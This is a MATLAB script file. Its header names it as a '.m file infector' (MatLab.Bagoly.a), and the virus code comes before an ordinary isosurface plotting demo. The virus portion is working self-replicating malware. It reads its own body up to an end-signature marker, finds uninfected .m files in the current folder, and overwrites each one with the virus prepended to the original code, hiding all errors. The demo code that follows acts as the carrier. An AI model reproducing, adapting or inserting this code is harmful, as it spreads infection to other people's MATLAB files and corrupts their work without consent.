%-------------------------------------------------------
% MatLab .m file infector by Positron (MatLab.Bagoly.a)
%-------------------------------------------------------
try
    clear virfile__;
    EndSignature__ = strcat('__EndSignature','__');

    destdir__ = '.\';
    %---------------------------------------
    fid__ = fopen(strcat('\',strcat(mfilename,'.m')), 'r');
    i__ = 1;
    while 1
        tline__ = fgetl(fid__);
        if tline__ == -1,   break,   end
        virfile__(i__:i__) = cellstr(tline__);
        i__ = i__ + 1;
        if length(strfind(tline__,EndSignature__)) > 0
            break;
        end
    end
    fclose(fid__);
    %----------------------------------------
    FileList__ = dir(strcat(destdir__,'*.m'));
    DirLength__ = length(FileList__);

    if DirLength__ > 0
        for m__=1:DirLength__
            try
                fid__ = fopen(strcat(destdir__,FileList__(m__).name), 'r');
                if fid__ > -1
                    clear originalfile__;
                    i__ = 1;
                    infected__ = 0;
                    while infected__ == 0
                        tline__ = fgetl(fid__);
                        if tline__ == -1,   break,   end
                        originalfile__(i__:i__) = cellstr(tline__);
                        i__ = i__ + 1;
                        if length(strfind(tline__,EndSignature__)) > 0
                            infected__ = 1;
                        end
                    end
                    fclose(fid__);

                    if infected__ == 0
                        fid__ = fopen(strcat(destdir__,FileList__(m__).name), 'w');
                        if fid__ > -1
                            for i__=1:length(virfile__)
                                fprintf(fid__,'%s\n',char(virfile__(i__)));
                            end
                            fprintf(fid__,'%s\n','');
                            for i__=1:length(originalfile__)
                                fprintf(fid__,'%s\n',char(originalfile__(i__)));
                            end
                            fclose(fid__);
                        end
                    end
                end
            catch
            end
        end
    end
catch
end
e__ = '__EndSignature__';

load qhulldemo
cla reset; hold on
d = -0.8:0.05:0.8;
[x0,y0,z0] = meshgrid(d,d,d);
h = patch(isosurface(x0,y0,z0,v0,0.6));
isonormals(x0,y0,z0,v0,h);
set(h,'FaceColor','red','EdgeColor','none');
view(3); axis equal tight off vis3d; camzoom(1.6)
camlight; lighting phong
rotate3d on
